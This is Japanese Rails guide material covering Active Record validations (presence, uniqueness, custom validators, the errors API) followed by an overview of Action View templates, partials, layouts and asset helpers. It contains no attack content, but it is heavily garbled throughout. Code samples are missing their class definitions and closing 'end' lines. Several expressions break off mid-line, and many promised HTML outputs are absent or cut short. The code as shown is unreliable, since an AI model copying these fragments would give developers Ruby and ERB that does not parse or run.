デフォルトのエラーメッセージは _"must be less than or equal to %{count}"_ です。
* `:odd` - trueに設定されている場合は、奇数でなければなりません。
デフォルトのエラーメッセージは _"must be odd"_ です。
* `:even` - trueに設定されている場合は、偶数でなければなりません。
デフォルトのエラーメッセージは _"must be even"_ です。
デフォルトのエラーメッセージは _"is not a number"_ です。
### `presence`
このヘルパーは、指定された属性が空でないことを確認します。
値が`nil`や空文字でない(つまり空欄でもなければホワイトスペースでもない)ことを確認するために、内部では`blank?`メソッドを使用しています。
  validates :name, :login, :email, presence: true
関連付けが存在することを確認したい場合は、関連付けられたオブジェクト自体が存在することを確認し、そのオブジェクトが関連付けにマッピングされた外部キーでないことを確認する必要があります。
class LineItem < ActiveRecord::Base
  belongs_to :order
  validates :order, presence: true
関連付けられたレコードの存在が必須である場合、これを検証するには`:inverse_of`オプションでその関連付けを指定する必要があります。
  has_many :line_items, inverse_of: :order
このヘルパーを使用して、`has_one`または`has_many`リレーションシップを経由して関連付けられたオブジェクトが存在することを検証すると、`blank?`でもなく`marked_for_destruction?`(削除するためにマークされている)でもないかどうかがチェックされます。
### `absence`
このヘルパーは、指定された属性が空であることを検証します。
値が`nil`や空文字である (つまり空欄またはホワイトスペースである) かどうかを確認するために、内部では`present?`メソッドを使用しています。
  validates :name, :login, :email, absence: true
関連付けが存在しないことを確認したい場合は、関連付けられたオブジェクト自体が存在しないかどうかを確認し、そのオブジェクトが関連付けにマッピングされた外部キーでないことを確認する必要があります。
  validates :order, absence: true
関連付けられたレコードが存在してはならない場合、これを検証するには`:inverse_of`オプションでその関連付けを指定する必要があります。
このヘルパーを使用して、`has_one`または`has_many`リレーションシップを経由して関連付けられたオブジェクトが存在しないことを検証すると、`presence?`でもなく`marked_for_destruction?`(削除するためにマークされている)でもないかどうかがチェックされます。
`false.present?`は常にfalseなので、真偽値に対してこのメソッドを使用すると正しい結果が得られません。真偽値が存在しないことをチェックしたい場合は、`validates :field_name, exclusion: { in: [true, false] }`を使用する必要があります。
デフォルトのエラーメッセージは _"must be blank"_ です。
### `uniqueness`
このヘルパーは、オブジェクトが保存される直前に、属性の値が一意であり重複していないことを検証します。
このヘルパーはデータベース自体に一意性の制約を作成するわけではないので、2つのデータベース接続がたまたま、一意であってほしいカラムについて同じ値を持つレコードを2つ作成するようなことが起こり得ます。
これを避けるには、データベースの両方のカラムに一意インデックスを作成する必要があります。
複合インデックスの詳細については[MySQLのマニュアル](http://dev.mysql.com/doc/refman/5.6/en/multiple-column-indexes.html) (英語) を参照してください。
  validates :email, uniqueness: true
このバリデーションは、モデルのテーブルに対して、その属性と同じ値を持つ既存のレコードがあるかどうかを調べるSQLクエリを実行することによって行われます。
このヘルパーには、一意性チェックを制限するために使用される別の属性を指定するための`:scope`オプションがあります。
class Holiday < ActiveRecord::Base
  validates :name, uniqueness: { scope: :year,
    message: "発生は年に1度までである必要があります" }
このヘルパーには`:case_sensitive`というオプションもあります。これは一意性制約で大文字小文字を区別するかどうかを指定します。
このオプションはデフォルトでtrueです。
  validates :name, uniqueness: { case_sensitive: false }
WARNING: 一部のデータベースでは、大文字小文字を区別しないように設定されていることがあります。
デフォルトのエラーメッセージは _"has already been taken"_ です。
### `validates_with`
このヘルパーは、バリデーション専用の別のクラスにレコードを渡します。
class GoodnessValidator < ActiveModel::Validator
  def validate(record)
    if record.first_name == "Evil"
      record.errors[:base] << "これは悪人だ"
  validates_with GoodnessValidator
NOTE: `record.errors[:base]`に追加されるエラーは、概して特定の属性よりもそのレコード全体の状態に関係しているものです。
`validates_with`は、バリデーションに使用する1つのクラス、またはクラスのリストを引数に取ります。
`validates_with`にはデフォルトのエラーメッセージはありません。
エラーメッセージが必要であれば、バリデータクラスのレコードのエラーコレクションに手動で追加する必要があります。
バリデーションメソッドを実装するには、定義済みの`record`パラメータを持つ必要があります。このパラメータはバリデーションを行なうレコードです。
他のバリデーションと同様、`validates_with`ヘルパーでも`:if`、`:unless`、`:on`オプションを取ることができます。
これら以外のオプションを渡すと、バリデータクラスに`options`として渡されます。
    if options[:fields].any?{
|field| record.send(field) == "Evil" }
  validates_with GoodnessValidator, fields: [:first_name, :last_name]
このバリデータは、アプリケーションのライフサイクル内で *一度しか初期化されない* 点にご注意ください。バリデーションが実行されるたびに初期化されるようなことはありません。インスタンス変数の扱いには十分ご注意ください。
作成したバリデータが複雑になってインスタンス変数を使いたくなった場合は、旧来のRubyオブジェクトを簡単に使うことができます。
  validate do |person|
    GoodnessValidator.new(person).validate
class GoodnessValidator
  def initialize(person)
    @person = person
  def validate
    if some_complex_condition_involving_ivars_and_private_methods?
      @person.errors[:base] << "これは悪人だ" 
### `validates_each`
このヘルパーは、1つのブロックに対して属性を検証します。
定義済みのバリデーション関数はありません。
以下の例では、苗字と名前が小文字で始まらないようにしたいと考えています。
  validates_each :name, :surname do |record, attr, value|
このブロックは、レコードと属性の名前、そして属性の値を受け取ります。
ブロック内でこれらを使用してデータが正しいかどうかを自由にチェックできます。
バリデーションに失敗した場合にはモデルにエラーメッセージを追加し、バリデーションが無効になるようにしてください。
共通のバリデーションオプション
共通のバリデーションオプションを以下に示します。
### `:allow_nil`
`:allow_nil`オプションは、対象の値が`nil`の場合にバリデーションをスキップします。
    message: "%{value}は有効な値ではありません" }, allow_nil: true
### `:allow_blank`
`:allow_blank`オプションは`:allow_nil`オプションと似ています。
このオプションを指定すると、属性の値が`blank?`に該当する場合にバリデーションがパスします。`blank?`に該当する値には`nil`と空文字も含まれます。
class Topic < ActiveRecord::Base
  validates :title, length: { is: 5 }, allow_blank: true
Topic.create(title: "").valid?  
Topic.create(title: nil).valid? 
### `:message`
既に例示したように、`:message`オプションを使用することで、バリデーション失敗時に`errors`コレクションに追加されるカスタムエラーメッセージを指定できます。
このオプションを使用しない場合、Active Recordはバリデーションヘルパーのデフォルトのエラーメッセージを使用します。
### `:on`
`:on`オプションは、バリデーション実行のタイミングを指定します。
ビルトインのバリデーションヘルパーは、デフォルトでは保存時に実行されます。これはレコードの作成時および更新時のどちらの場合にも行われます。
バリデーションのタイミングを変更したい場合、`on: :create`を指定すればレコード新規作成時にのみ検証が行われ、`on: :update`を指定すればレコードの更新時にのみ検証が行われます。
  # 値が重複していてもemailを更新できる
  validates :email, uniqueness: true, on: :create
  # 新規レコード作成時に、数字でない年齢表現を使用できる
  validates :age, numericality: true, on: :update
  # デフォルト (作成時と更新時のどちらの場合にもバリデーションを行なう)
厳密なバリデーション
バリデーションを厳密にし、オブジェクトが無効だった場合に`ActiveModel::StrictValidationFailed`が発生するようにすることができます。
  validates :name, presence: { strict: true }
Person.new.valid?  
# => ActiveModel::StrictValidationFailed: 名前は空欄にできません
カスタムの例外を`:strict`オプションに追加することもできます。
  validates :token, presence: true, uniqueness: true, strict: TokenGenerationException
# => TokenGenerationException: トークンは空欄にできません
条件付きバリデーション
特定の条件を満たす場合にのみバリデーションを実行したい場合があります。
`:if`オプションや`:unless`オプションを使用することでこのような条件を指定できます。引数にはシンボル、文字列、`Proc`または`Array`を使用できます。
`:if`オプションは、特定の条件でバリデーションを行なう **べきである** 場合に使用します。
特定の条件ではバリデーションを行なう **べきでない** 場合は、`:unless`オプションを使用します。
### `:if`や`:unless`でシンボルを使用する
バリデーションの実行直前に呼び出されるメソッド名をシンボルで`:if`や`:unless`オプションに指定することもできます。
これは最も頻繁に使用されるオプションです。
  validates :card_number, presence: true, if: :paid_with_card?
  def paid_with_card?
    payment_type == "card"
### `:if`や`:unless`で文字列を使用する
文字列を使用することもできます。この文字列は後で`eval`で評価されるため、実行可能な正しいRubyコードを含んでいる必要があります。
この方法は、文字列が十分短い場合にのみ使用するのがよいでしょう。
  validates :surname, presence: true, if: "name.nil?"
### `:if`や`:unless`でProcを使用する
呼び出したい`Proc`オブジェクトを`:if`や`:unless`で使用することもできます。
`Proc`オブジェクトを使用すると、個別のメソッドを指定する代りに、その場で条件を書くことができるようになります。
ワンライナーに収まる条件を使用したい場合に最適です。
  validates :password, confirmation: true,
    unless: Proc.new { |a| a.password.blank? 
### 条件付きバリデーションをグループ化する
1つの条件を複数のバリデーションで共用できると便利なことがあります。これは`with_options`を使用することで簡単に実現できます。
  with_options if: :is_admin? 
do |admin|
    admin.validates :password, length: { minimum: 10 }
    admin.validates :email, presence: true
`with_options`ブロックの内側にあるすべてのバリデーションには、`if: :is_admin?`という条件が渡されます。
### バリデーションの条件を結合する
逆に、バリデーションを行なう条件を複数定義したい場合、`Array`を使用できます。
同じバリデーションに対して、`:if`または`:unless`のどちらでも使用できます。
class Computer < ActiveRecord::Base
  validates :mouse, presence: true,
                    if: ["market.retail?", :desktop?]
                    unless: Proc.new { |c| c.trackpad.present? 
このバリデーションは、`:if`条件がすべて`true`になり、かつ`:unless`が1つも`true`にならない場合にのみ実行されます。
カスタムバリデーションを実行する
ビルトインのバリデーションヘルパーだけでは不足の場合、好みのバリデータやバリデーションメソッドを作成して使用できます。
### カスタムバリデータ
カスタムバリデータ (validator) は、`ActiveModel::Validator`を拡張したクラスです。
これらのクラスでは、`validate`メソッドが実装されている必要があります。このメソッドはレコードを1つ引数に取り、それに対してバリデーションを実行します。
カスタムバリデータは`validates_with`メソッドを使用して呼び出します。
class MyValidator < ActiveModel::Validator
    unless record.name.starts_with? 
      record.errors[:name] << '名前はXで始まる必要があります' 
class Person
  include ActiveModel::Validations
  validates_with MyValidator
個別の属性を検証するためのカスタムバリデータを追加するには、`ActiveModel::EachValidator`を使用するのが最も簡単で便利です。
class EmailValidator < ActiveModel::EachValidator
  def validate_each(record, attribute, value)
    unless value =~ /\A([^@\s]+)@((?:[-a-z0-9]+\.)+[a-z]{2,})\z/i
      record.errors[attribute] << (options[:message] || "は正しいメールアドレスではありません")
  validates :email, presence: true, email: true
上の例に示したように、標準のバリデーションとカスタムバリデーションを組み合わせることもできます。
### カスタムメソッド
モデルの状態を確認し、無効な場合に`errors`コレクションにメッセージを追加するメソッドを作成することができます。
1つのクラスメソッドには複数のシンボルを渡すことができます。バリデーションは、登録されたとおりの順序で実行されます。
class Invoice < ActiveRecord::Base
  validate :expiration_date_cannot_be_in_the_past,
    :discount_cannot_be_greater_than_total_value
  def expiration_date_cannot_be_in_the_past
    if expiration_date.present? 
&& expiration_date < Date.today
      errors.add(:expiration_date, ": 過去の日付は使用できません")
  def discount_cannot_be_greater_than_total_value
    if discount > total_value
      errors.add(:discount, "合計額を上回ることはできません")
これらのバリデーションは、`valid?`を呼び出すたびに実行されます。
カスタムバリデーションが実行されるタイミングは、`:on`オプションを使用して変更できます。`validate`に対して`on: :create`または`on: :update`を指定します。
  validate :active_customer, on: :create
  def active_customer
    errors.add(:customer_id, "is not active") unless customer.active?
バリデーションエラーに対応する
既に説明した`valid?`メソッドや`invalid?`メソッドの他に、Railsでは`errors`コレクションに対応し、オブジェクトの正当性を検査するためのメソッドが多数用意されています。
以下は最もよく使用されるメソッドの一覧です。
利用可能なすべてのメソッドについては、`ActiveModel::Errors`ドキュメントを参照してください。
### `errors`
すべてのエラーを含む`ActiveModel::Errors`クラスのインスタンスを1つ返します。
キーは属性名、値はすべてのエラー文字列の配列です。
  validates :name, presence: true, length: { minimum: 3 }
person = Person.new
person.valid? 
person.errors.messages
person = Person.new(name: "John Doe")
person.errors.messages # => {}
`errors[]`は、特定の属性についてエラーメッセージをチェックしたい場合に使用します。
指定の属性に関するすべてのエラーメッセージの文字列の配列を返します。1つの文字列が1つのエラーメッセージです。
属性に関連するエラーがない場合は空の配列を返します。
person.errors[:name] # => []
person = Person.new(name: "JD")
person.errors[:name]
### `errors.add`
`add`メソッドを使用して、特定の属性に関連するメッセージを手動で追加できます。
`errors.full_messages`メソッドまたは`errors.to_a`メソッドを使用して、ユーザーが実際に見ることのできるフォーム内のメッセージを表示できます。
これら特定のメッセージの前には、大文字で始まる属性名が追加されます。`add`メソッドは、メッセージを追加したい属性名、およびメッセージ自身を受け取ります。
  def a_method_used_for_validation_purposes
    errors.add(:name, "以下の文字を含むことはできません !
person = Person.create(name: "!
 # => ["以下の文字を含むことはできません !
person.errors.full_messages
`[]=`セッターを使用して同じことを行えます。
    def a_method_used_for_validation_purposes
      errors[:name] = "以下の文字を含むことはできません !
  person = Person.create(name: "!
  person.errors[:name]
   # => ["以下の文字を含むことはできません !
  person.errors.to_a
   # => ["Nameは以下の文字を含むことはできません !
### `errors[:base]`
個別の属性に関連するエラーメッセージを追加する代りに、オブジェクトの状態全体に関連するエラーメッセージを追加することもできます。
属性の値がどのようなものであってもオブジェクトが無効であることを通知したい場合にこのメソッドを使用できます。
`errors[:base]`は配列なので、これに文字列を単に追加するだけでエラーメッセージとして使用できるようになります。
    errors[:base] << "この人物は以下の理由で無効です..."
### `errors.clear`
`clear`メソッドは、`errors`コレクションに含まれるメッセージをすべてクリアしたい場合に使用できます。
無効なオブジェクトに対して`errors.clear`メソッドを呼び出しても、それだけでオブジェクトが有効になるわけではありませんのでご注意ください。`errors`は空になりますが、`valid?`やオブジェクトをデータベースに保存しようとするメソッドが次回呼び出されたときに、バリデーションが再実行されます。
そしていずれかのバリデーションが失敗すると、`errors`コレクションに再びメッセージが格納されます。
person.errors.clear
person.errors.empty? 
p.save # => false
p.errors[:name]
### `errors.size`
`size`メソッドは、そのオブジェクトのエラーメッセージの総数を返します。
person.errors.size # => 2
person = Person.new(name: "Andrea", email: "andrea@example.com")
person.errors.size # => 0
バリデーションエラーをビューで表示する
モデルを作成してバリデーションを追加し、Webのフォーム経由でそのモデルが作成できるようになったら、そのモデルでバリデーションが失敗したときにエラーメッセージを表示したくなります。
エラーメッセージの表示方法はアプリケーションごとに異なるため、Railsではこれらのメッセージを直接生成するビューヘルパーは含まれていません。
しかし、Railsでは一般的なバリデーションメソッドが多数提供されているので、カスタムのメソッドを作成するのは比較的簡単です。
また、scaffoldを使用して生成を行なうと、そのモデルのエラーメッセージをすべて表示するERBがRailsによって一部の`_form.html.erb`ファイルに追加されます。
  <div id="error_explanation">
    <ul>
      <li><%= msg %></li>
    <% end %>
    </ul>
  </div>
また、Railsのフォームヘルパーを使用してフォームを生成した場合、あるフィールドでバリデーションエラーが発生すると、そのエントリの周りに追加の`<div>`が自動的に生成されます。
<div class="field_with_errors">
</div>
このdivタグに好みのスタイルを与えることができます。
Railsが生成するデフォルトのscaffoldによって、以下のCSSルールが追加されます。
.field_with_errors {
  padding: 2px;
  background-color: red;
  display: table;
このCSSは、エラーを含むフィールドを赤い枠で囲みます。
Action View の概要
* Action Viewの概要とRailsでの利用法
* テンプレート、パーシャル(部分テンプレート)、レイアウトの最適な利用法
* Action Viewで提供されるヘルパーの紹介と、カスタムヘルパーの作成法
* ビューのローカライズ方法
Action Viewについて
Action ViewおよびAction Controllerは、Action Packを構成する2大要素です。
Railsでは、WebリクエストはAction Packで取り扱われます。この動作はコントローラ寄りの部分 (ロジックの実行) とビュー寄りの部分(テンプレートの描画) に分かれます。
Action Controllerは、データベースとのやりとりや、必要に応じたCRUD (Create/Read/Update/Delete) アクションの実行にかかわります。
Action View はその後レスポンスを実際のWebページにまとめる役割を担います。
Action Viewのテンプレートは、HTMLタグの合間にERB (Embedded Ruby) を含む形式で書かれます。
ビューテンプレートがコードの繰り返しでうずまって乱雑になるのを避けるために、フォーム・日付・文字列に対して共通の動作を提供するヘルパークラスが多数用意されています。
アプリケーションの機能向上に応じて独自のヘルパーを追加することも簡単にできます。
NOTE: Action Viewの一部の機能はActive Recordと結びついていますが、Action ViewがActive Recordに依存しているわけではありません。
Action Viewは独立したパッケージであり、どのようなRubyライブラリとでも組み合わせて使用できます。
Action ViewをRailsで使用する
アプリケーションの`app/views`ディレクトリには、1つのコントローラごとに1つのディレクトリが作成され、そこにビューテンプレートファイルが置かれます。このビューテンプレートはそのコントローラと関連付けられています。
これらのファイルは、コントローラ内にあるアクションごとに出力された結果をビューで表示するために使用されます。
scaffoldを使用してリソースを生成するときに、Railsがデフォルトでどんなことを行なうのか見てみましょう。
      [...]
      invoke  scaffold_controller
    create
    app
      invoke    erb
    app
Railsのビューには命名規則があります。
上で生成されたファイルを見るとわかるように、ビューテンプレートファイルは基本的にコントローラのアクションと関連付けられています。
これらのERBファイルに、それらを内包するレイアウトテンプレートや、ビューから参照されるあらゆるパーシャル (部分テンプレート) が組み合わさって完全なHTMLが生成され、クライアントに送信されます。
テンプレート、パーシャル、レイアウト
### テンプレート
Action Viewのテンプレートはさまざまな方法で記述することができます。
Railsでは複数のテンプレートシステムがサポートされており、テンプレートファイルの拡張子で区別されます。
たとえば、ERBテンプレートシステムを使用するHTMLファイルの拡張子は`.html.erb`になります。
#### ERB
ERBテンプレートの内部では、`<% %>`タグや`<%= %>`タグにRubyコードを含めることができます。
最初の`<% %>`タグはその中に書かれたRubyコードを実行しますが、実行結果は出力されません。条件文やループ、ブロックなど出力の不要な行はこのタグの中に書くとよいでしょう。次の`<%= %>`タグでは実行結果がWebページに出力されます。
以下は、名前を出力するためのループです。
```html+erb
<h1>Names of all the people</h1>
<% @people.each do |person| %>
  Name: <%= person.name %><br>
以下のコードは誤りです。
<%# 間違い %>
Hi, Mr. <% puts "Frodo" %>
なお、Webページへの出力結果の最初と最後からホワイトスペースを取り除きたい場合は`<%-` および `-%>`を通常の`<%` および `%>`と交互にご使用ください (訳注: これは英語のようなスペース分かち書きを行なう言語向けのノウハウです)。
#### Builderテンプレート
BuilderテンプレートはERBの代わりに使用できる、よりプログラミング向きな記法です。
これは特にXMLコンテンツの生成を得意とします。
テンプレートの拡張子を`.builder`にすると、`xml`という名前のXmlMarkupオブジェクトが自動で使用できるようになります。
基本的な例を以下にいくつか示します。
xml.em("emphasized")
xml.em { xml.b("emph & bold") }
xml.a("A Link", "href" => "http://rubyonrails.org")
xml.target("name" => "compile", "option" => "fast")
上のコードから以下が生成されます。
<em>emphasized</em>
<em><b>emph &amp; bold</b></em>
<a href="http://rubyonrails.org">A link</a>
<target option="fast" name="compile" />
ブロックを後ろに伴うメソッドはすべて、ブロックの中にネストしたマークアップを含むXMLマークアップタグとして扱われます。
以下の例で示します。
xml.div {
  xml.h1(@person.name)
  xml.p(@person.bio)
上のコードの出力は以下のようなものになります。
<div>
  <h1>David Heinemeier Hansson</h1>
  <p>A product of Danish Design during the Winter of '79...</p>
以下はBasecampで実際に使用されているRSS出力コードをそのまま引用したものです。
xml.rss("version" => "2.0", "xmlns:dc" => "http://purl.org/dc/elements/1.1/") do
  xml.channel do
    xml.title(@feed_title)
    xml.link(@url)
    xml.description "Basecamp: Recent items"
    xml.language "en-us"
    xml.ttl "40"
    for item in @recent_items
      xml.item do
        xml.title(item_title(item))
        xml.description(item_description(item)) if item_description(item)
        xml.pubDate(item_pubDate(item))
        xml.guid(@person.firm.account.url + @recent_items.url(item))
        xml.link(@person.firm.account.url + @recent_items.url(item))
        xml.tag!("
dc:creator", item.author_name) if item_has_creator?(
#### テンプレートをキャッシュする
Railsは、デフォルトですべてのビューテンプレートをコンパイルしてメソッド化し、出力に備えます。
developmentモードの場合、ビューテンプレートが変更されるとファイルの日付で変更が検出され、再度コンパイルされます。
### パーシャル
部分テンプレートまたはパーシャルは、出力を扱いやすく分割するための仕組みです。
パーシャルを使用することで、ビュー内のコードをいくつものファイルに分割して書き出し、他のテンプレートでも使いまわすことができます。
#### パーシャルの命名ルール
<%= render "menu" %>
上の呼び出しにより、`_menu.html.erb`という名前のファイルの内容が、renderメソッドを書いたその場所でレンダリングされます。
パーシャルファイル名の冒頭にはアンダースコアが付いていることにご注意ください。これは通常のビューと区別するために付けられています。ただしrenderで呼び出す際にはこのアンダースコアは不要です。
以下のように、他のフォルダの下にあるパーシャルを呼び出す際にもアンダースコアは不要です。
<%= render "shared/menu" %>
上のコードでは、`app/views/shared/_menu.html.erb`パーシャルを読み込んで使用します。
#### パーシャルを活用してビューを簡潔に保つ
すぐに思い付くパーシャルの使い方といえば、パーシャルをサブルーチンと同等のものとみなすというのがあります。ビューの詳細部分をパーシャルに移動し、コードの見通しを良くするために、パーシャルを使うのです。
たとえば、以下のようなビューがあるとします。
<%= render "shared/ad_banner" %>
<h1>Products</h1>
<p>Here are a few of our fine products:</p>
<%= render "shared/footer" %>
上のコードの`_ad_banner.html.erb`パーシャルと`_footer.html.erb`パーシャルに含まれるコンテンツは、アプリケーションの多くのページと共有できます。
あるページを開発中、パーシャルの部分については詳細を気にせずに済みます。
#### `as`と`object`オプション
`ActionView::Partials::PartialRenderer`は、デフォルトでテンプレートと同じ名前を持つローカル変数の中に自身のオブジェクトを持ちます。
以下のコードを見てみましょう。
<%= render partial: "product" %>
上のコードでは、ローカル変数である`product`の中に`@product`が置かれます。これは以下のコードと同等の結果になります。
`as`オプションは、ローカル変数の名前を変更したい場合に使用します。
たとえば、ローカル変数名を`product`ではなく`item`にしたいのであれば、以下のようにします。
`object`オプションは、パーシャルで出力するオブジェクトを直接指定したい場合に使用します。これは、テンプレートのオブジェクトが他の場所 (別のインスタンス変数や別のローカル変数) にある場合に便利です。
たとえば、以下のコードがあるとします。
上のコードは以下のようになります。
<%= render partial: "product", object: @item %>
`object`オプションと`as`オプションは同時に使用することもできます。
#### コレクションを出力する
すべての製品(products)を出力するコード例は以下のようになります。
上のコードは以下のように1行で書けます。
コレクション出力には短縮記法があります。
`@products`が`Product`インスタンスのコレクションであれば、以下のコードでも同じ結果を得られます。
<%= render @products %>
使用されるパーシャル名は、コレクションの中にある「モデル名」を参照して決定されます。この場合のモデル名は`Product`です。
#### スペーサーテンプレート
`:spacer_template`オプションを使用すると、主要なパーシャル同士の間を埋める第二のパーシャルを指定することができます。
<%= render partial: @products, spacer_template: "product_ruler" %>
### レイアウト
Railsにおける「レイアウト」は、多くのコントローラのアクションにわたって共通して使用できるテンプレートのことです。
ログインしたユーザー向けのレイアウトであれば、ナビゲーションツールバーをページのトップレベルに表示し、多くのコントローラ/アクションで共通して使用できるようにするでしょう。
レイアウトごとに異なる外観を設定してこれらを使い分けることができます。
レイアウトとレンダリング
パーシャルレイアウト
パーシャルに独自のレイアウトを適用することができます。
  <%= yield %>
  <p>
上のコードの出力は以下のようになります。
    <p>
ただし、アプリケーション全体で共通のレイアウトとは異なり、パーシャルレイアウトのファイル名冒頭にはアンダースコアが必要です。
`yield`を呼び出す代わりに、パーシャルレイアウト内にあるコードのブロックを出力することもできます。
  <% end %>
ここでは、同じ`_box`パーシャルを使用する前提であり、先の例と同じ出力が得られます。
ビューのパス
(執筆予定)
Action Viewが提供するヘルパーの概要
-------------------------------------------
WIP: このリストにまだ含まれていないヘルパーがあります。
完全なリストについては[APIドキュメント](http://api.rubyonrails.org/classes/ActionView/Helpers.html)を参照してください。
Action Viewで利用できるヘルパーの概要を以下に示します。
[APIドキュメント](http://api.rubyonrails.org/classes/ActionView/Helpers.html) も参照して調べ直すことをお勧めします。APIドキュメントにはすべてのヘルパーの詳細が記載されており、本ガイドは概要を把握するためのものです。
### RecordTagHelper
このモジュールは、`div`などのコンテナタグを生成するメソッドを提供します。
Active Recordオブジェクトを出力するためのコンテナ作成方法にはこれを使うことをお勧めします。この方法であれば、適切なクラスとid属性がコンテナに追加されるからです。
これにより、これらのコンテナを通常の方法で簡単に参照でき、どのクラスやどのid属性を使用すべきかどうかを考えずに済みます。
#### content_tag_for
Active Recordオブジェクトに関連付けられるコンテナタグを出力します。
たとえば
上のコードによって以下のHTMLが生成されます。
  <td>Hello World!
</tr>
オプションのハッシュを追加することで、HTML属性を指定することもできます。
上のコードによって以下のHTMLが生成されます。
Active Recordオブジェクトのコレクションを渡すこともできます。
  <td>Ruby on Rails Rocks!
#### div_for
このメソッドは内部で`content_tag_for`を呼び出して`:div`をタグ名にしてくれる、便利なメソッドです。
Active Recordオブジェクトを単体またはコレクションとして渡すことができます。
### AssetTagHelper
このモジュールは、画像・JavaScriptファイル・スタイルシート・フィードなどのアセットにビューをリンクするHTMLを生成するメソッドを提供します。
デフォルトでは、現在ホストされているpublicフォルダ内のアセットに対してリンクしますが、アプリケーション設定 (通常は`config/environments/production.rb`) の`config.action_controller.asset_host`で設定されているアセット用サーバーにリンクすることもできます。
たとえば、`assets.example.com`というアセット専用ホストを使用したいとします。
config.action_controller.asset_host = "assets.example.com"
image_tag("rails.png") # => <img src="http://assets.example.com/images/rails.png" alt="Rails" />
#### auto_discovery_link_tag
ブラウザやフィードリーダーが検出可能なRSSフィードやAtomフィードのリンクタグを返します。
#### image_path
`app/assets/images`に置かれている画像アセットへのパスを算出します。
ドキュメントルート・ディレクトリからの完全なパスが返されます。
このメソッドの内部では画像へのパス作成に`image_tag`が使用されています。
image_path("edit.png") # => /assets/edit.png
config.assets.digestがtrueに設定されている場合、ファイル名にフィンガープリントが追加されます。
image_path("edit.png") # => /assets/edit-2d1a2db63fc738690021fedb5a65b68e.png
#### image_url
`app/assets/images`に置かれている画像アセットへのURLを算出します。
このメソッドは内部で`image_path`を呼び出しており、現在のホストまたはアセット用のホストとマージしてURLを生成します。
image_url("edit.png") # => http://www.example.com/assets/edit.png
#### image_tag
画像へのフルパス、または`app/assets/images`ディレクトリ内にあるファイルを引数として与えられます。
image_tag("icon.png") # => <img src="/assets/icon.png" alt="Icon" />
#### javascript_include_tag
`app/assets/javascripts`ディレクトリにあるJavaScriptファイル名 (拡張子`.js`はあってもなくても構いません) を引数として渡すことができます。この結果は現在のページにインクルードされます。ドキュメントルートからの相対完全パスを渡すこともできます。
javascript_include_tag "common" # => <script src="/assets/common.js"></script>
アプリケーションでアセットパイプラインを使用せずにjQuery JavaScriptライブラリをインクルードする場合は、ソースとして`:defaults`を渡してください。
`:defaults`を指定した場合、`app/assets/javascripts`ディレクトリに`application.js`というファイルがあればこれもインクルードされます。
javascript_include_tag :defaults
ソースに`:all`を指定すると、`app/assets/javascripts`ディレクトリ以下にあるJavaScriptファイルをすべてインクルードできます。
javascript_include_tag :all
複数のJavaScriptファイルをキャッシュして1つのファイルにすることができます。こうすることでJavaScriptファイルのダウンロードに必要なHTTP接続数を減らすことができ、速度が向上します。gzip圧縮すればさらに転送が速くなります。
キャッシュが有効になるのは、`ActionController::Base.perform_caching`をtrueに設定した場合のみです。production環境ではデフォルトでtrueになりますが、development環境ではデフォルトではtrueになりません。
javascript_include_tag :all, cache: true # =>
  <script src="/javascripts/all.js"></script>
#### javascript_path
`app/assets/javascripts`に置かれているJavaScriptアセットへのパスを算出します。
ソースのファイル名に拡張子`.js`がない場合は自動的に補われます。
スクリプトパス作成のために内部で`javascript_include_tag`が使用されています。
javascript_path "common" # => /assets/common.js
#### javascript_url
`app/assets/javascripts`に置かれているJavaScriptアセットへのURLを算出します。
このメソッドは内部で`javascript_path`を呼び出しており、現在のホストまたはアセット用のホストとマージしてURLを生成します。
javascript_url "common" # => http://www.example.com/assets/common.js
#### stylesheet_link_tag
引数として指定されたソースにあるスタイルシートへのリンクタグを返します。
拡張子が指定されていない場合は、`.css`が自動的に補われます。
stylesheet_link_tag "application" # => <link href="/assets/application.css" media="screen" rel="stylesheet" />
ソースに`:all`を指定すると、stylesheetディレクトリにあるすべてのスタイルシートを含めることができます。
stylesheet_link_tag :all
複数のスタイルシートファイルをキャッシュして1つのファイルにすることができます。こうすることでスタイルシートファイルのダウンロードに必要なHTTP接続数を減らすことができ、速度が向上します。gzip圧縮すればさらに転送が速くなります。
キャッシュが有効になるのは、`ActionController::Base.perform_caching`をtrueに設定した場合のみです。production環境ではデフォルトでtrueになりますが、development環境ではデフォルトではtrueになりません。
stylesheet_link_tag :all, cache: true
# => <link href="/assets/all.css" media="screen" rel="stylesheet" />
#### stylesheet_path
`app/assets/stylesheets`に置かれているスタイルシートアセットへのパスを算出します。
ソースのファイル名に拡張子`.css`がない場合は自動的に補われます。
このメソッドの内部ではスタイルシートへのパス作成に`stylesheet_link_tag`が使用されています。
stylesheet_path "application" # => /assets/application.css
#### stylesheet_url
`app/assets/stylesheets`に置かれているスタイルシートアセットへのURLを算出します。
このメソッドは内部で`stylesheet_path`を呼び出しており、現在のホストまたはアセット用のホストとマージしてURLを生成します。
stylesheet_url "application" # => http://www.example.com/assets/application.css
### AtomFeedHelper
#### atom_feed
このヘルパーを使用して、Atomフィードを簡単に生成できます。
以下にすべての使用例を示します。
**config/routes.rb**
def index
  respond_to do |format|
    format.html
    format.atom
atom_feed do |feed|
      entry.author do |author|
### BenchmarkHelper
#### benchmark
テンプレート内の1つのブロックの実行時間測定と、結果のログ出力に使用します。
実行に時間のかかる行や、ボトルネックになる可能性のある行をこのブロックで囲み、実行にかかった時間を読み取ります。
<% benchmark "Process data files" do %>
  <%= expensive_files_operation %>
上のコードは、"Process data files (0.34523)"のようなログを出力します。このログは、コード最適化のためにタイミングを比較する際に役立てることができます。
### CacheHelper
#### cache
`cache`メソッドは、(アクション全体やページ全体ではなく) ビューの断片をキャッシュするメソッドです。
この手法は、メニュー・ニュース記事・静的HTMLの断片などをキャッシュするのに便利です。
このメソッドには、キャッシュしたいコンテンツを1つのブロックに含めて引数として渡します。
詳細については、`ActionController::Caching::Fragments`を参照してください。
<% cache do %>
  <%= render "shared/footer" %>
### CaptureHelper
#### capture
`capture`メソッドを使用することで、テンプレートの一部を変数に保存することができます。
保存された変数は、テンプレートやレイアウトのどんな場所でも自由に使用できます。
<% @greeting = capture do %>
  <p>Welcome! 
The date and time is <%= Time.now %></p>
上でキャプチャした変数は以下のように他の場所で自由に使用できます。
<html>
  <head>
    <title>Welcome!
  </head>
  <body>
    <%= @greeting %>
  </body>
</html>
#### content_for
`content_for`を呼び出すと、後の利用に備えて、idに対応するマークアップのブロックが保存されます。
以後、保存されたコンテンツを他のテンプレートやレイアウトで呼び出すことができます。呼び出しの際には、`yield`の引数となるidを渡します。
